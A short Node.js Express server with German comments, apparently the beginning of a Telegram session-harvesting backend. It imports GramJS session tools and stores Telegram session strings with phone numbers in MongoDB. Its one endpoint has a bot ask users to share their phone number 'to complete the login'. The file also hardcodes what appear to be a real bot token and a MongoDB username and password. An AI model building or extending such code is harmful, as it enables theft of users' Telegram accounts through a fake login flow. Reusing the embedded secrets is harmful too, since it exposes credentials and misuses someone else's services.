const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

// Hier das Token in Anführungszeichen setzen!
const bot = new TelegramBot('8963838309:AAFpv3lF_v_kWvZZYR96D8mM3nA3oawatow', { polling: true });
const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Verbindung
mongoose.connect('mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority');

const SessionSchema = new mongoose.Schema({ sessionString: String, phone: String });
const Session = mongoose.model('Session', SessionSchema);

// Endpoint für den Start des Prozesses
app.post('/request-login', async (req, res) => {
    const { telegramId } = req.body;
    
    // Bot schickt die Kontakt-Anfrage
    await bot.sendMessage(telegramId, "Bitte teile deine Nummer, um den Login abzuschließen:", {
        reply_markup: {
            keyboard: [[{ text: "Nummer teilen", request_contact: true }]],
            one_time_keyboard: true
        }
    });
    res.json({ status: 'requested' });
});

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
